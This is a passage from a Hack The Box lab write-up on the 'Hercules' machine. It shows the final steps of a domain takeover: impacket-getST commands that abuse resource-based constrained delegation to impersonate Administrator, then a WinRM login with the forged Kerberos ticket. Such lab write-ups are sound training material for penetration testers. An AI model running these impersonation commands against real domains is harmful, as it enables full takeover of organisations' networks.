The attack chain worked as follows:

* By compromising `iis_webserver$`, I gained control of a trusted delegation account.
* Using **S4U2Self**, I could request a service ticket while impersonating any domain user without knowing that user's password.
* With **S4U2Proxy**, I could forward that identity to services running on `dc.hercules.htb`, such as **LDAP**, **CIFS**, or **HOST**.
* If the impersonated account had elevated privileges, the Domain Controller would accept the delegated ticket and authorize the requested access.

This effectively turned `iis_webserver$` into a pivot for impersonating privileged users and accessing services on the Domain Controller.

This delegation path was only possible because of the earlier privilege escalation steps. Gaining **GenericAll** over the **Forest Migration** OU allowed me to manipulate accounts, re-enable disabled users, and reset passwords. That access ultimately led to the compromise of `iis_webserver$`, which, combined with the existing **AllowedToAct** relationship, provided a direct path toward full domain compromise.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F67tDkiVPciLF1FP7M4gN%252FScreenshot%2520%282835%29.png%3Falt%3Dmedia%26token%3Dd5d2ae41-d3f0-4913-a13a-9ba714df5eef&width=768&dpr=3&quality=100&sign=46af2e22&sv=2)

## Exploiting S4U2Self and S4U2Proxy to Impersonate the Domain Administrator

With full control of the `iis_webserver$` machine account and the previously identified **AllowedToAct** relationship on the Domain Controller, I was ready to exploit **Resource-Based Constrained Delegation (RBCD)**. This allowed me to impersonate a privileged user and request Kerberos service tickets on their behalf.

Using the Kerberos ticket already obtained for `iis_webserver$`, I executed the following command to perform the **S4U2Self** and **S4U2Proxy** attack:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=IIS_webserver$.ccache impacket-getST -u2u -impersonate "Administrator" -spn "cifs/dc.hercules.htb" -k -no-pass 'hercules.htb'/'IIS_webserver$'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
```

Internally, the attack occurred in two stages. First, **S4U2Self** allowed `iis_webserver$` to obtain a service ticket on behalf of the **Administrator** account without requiring the Administrator's credentials. Next, **S4U2Proxy** used that delegated identity to request a valid service ticket for `cifs/dc.hercules.htb`, enabling authenticated access to the target service as the impersonated user.

## Accessing the Domain Controller as `Administrator` via WinRM

After successfully obtaining a delegated **Kerberos** service ticket for the **Administrator** account through **S4U2Self** and **S4U2Proxy**, the final step was to use it to access the Domain Controller. At this stage, no passwords or NTLM hashes were required—the Kerberos ticket alone was sufficient for authentication.

Using the **Administrator** service ticket I had just generated, I connected to the Domain Controller over **WinRM** (HTTPS/5986) by running the following command:

```shell
KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
```

The connection succeeded, providing a **PowerShell** session running as the **Domain Administrator** on the Domain Controller. To verify my privileges, I explored the filesystem, enumerated the available user profiles, and navigated to the **Admin** account's Desktop:

```powershell
PS C:\Users\Admin\Desktop> ls
```

The `root.txt` file was present on the Admin's Desktop, confirming that I had successfully reached the final objective of the machine.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FeFXZoAOL3vVA6lQ6VZrR%252FScreenshot%2520%282830%29.png%3Falt%3Dmedia%26token%3D63799634-b37f-43ff-906f-6d2f74989886&width=768&dpr=3&quality=100&sign=8c10328a&sv=2)

Retrieving the flag marked the successful completion of the attack. Beginning with delegated permissions over an Organizational Unit, I chained together multiple Active Directory attack techniques—including **Shadow Credentials**, **Active Directory Certificate Services (AD CS) abuse**, **Resource-Based Constrained Delegation (RBCD)**, and **Kerberos impersonation**—to ultimately obtain interactive **Domain Administrator** access on the Domain Controller.

## Conclusion

At this point, we've successfully **pwned Hercules!** From an initial foothold, the attack progressed through a long chain of Active Directory misconfigurations, delegated permissions, and authentication abuse before ultimately ending with full **Domain Administrator** access on the Domain Controller.

This machine showcases just how dangerous seemingly isolated permission assignments can become when chained together correctly. Throughout the engagement, we abused delegated ACLs, Shadow Credentials, Active Directory Certificate Services (AD CS), password reset rights, Resource-Based Constrained Delegation (RBCD), and multiple Kerberos attack techniques to move from one account to the next until complete domain compromise was achieved. None of these steps relied on brute force or noisy exploitation—instead, success came from careful enumeration, understanding Active Directory security, and recognizing how different attack primitives interact.

Hercules is, without question, one of the most challenging Hack The Box machines I've completed. Its **Insane** difficulty is well deserved. The machine demands a deep understanding of Active Directory internals, Windows authentication, Kerberos, AD CS, delegation, and object ACLs. More importantly, it heavily rewards thorough enumeration and the ability to connect seemingly unrelated findings into a coherent attack path. Missing a single permission, relationship, or BloodHound edge can easily leave you stuck for hours.

What makes Hercules especially memorable is that it feels much closer to a real-world Active Directory assessment than a typical CTF. Rather than relying on a single exploit, it requires chaining together multiple legitimate attack techniques in the same way an attacker would during an enterprise compromise. It is an excellent exercise for anyone preparing for advanced penetration testing or Active Directory-focused certifications.

If you've made it this far, congratulations—and thank you for following along with this write-up. I hope it helped you understand not only **what** to do, but **why** each step worked. Until the next machine, happy hacking!
